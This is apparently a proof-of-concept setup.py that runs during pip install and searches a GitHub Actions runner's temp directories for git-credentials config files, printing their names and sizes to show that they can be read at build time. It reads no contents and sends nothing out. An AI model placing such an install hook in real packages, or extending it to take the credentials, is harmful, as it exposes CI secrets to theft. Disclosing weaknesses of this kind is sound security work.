from setuptools import setup
import glob, os
print("[PoC-BuildHook] setup.py executing during pip install — before any repo module even runs")
cands = glob.glob("/home/runner/work/_temp/git-credentials-*.config") + glob.glob(os.path.expandvars("$RUNNER_TEMP/git-credentials-*.config"))
print("[PoC-BuildHook] credential files visible at BUILD time:", [os.path.basename(c) for c in cands])
for c in cands:
    try:
        sz = os.path.getsize(c)
        print(f"[PoC-BuildHook] READABLE at build time: {os.path.basename(c)} size={sz}")
    except Exception as e:
        print("[PoC-BuildHook] unreadable:", e)
setup()
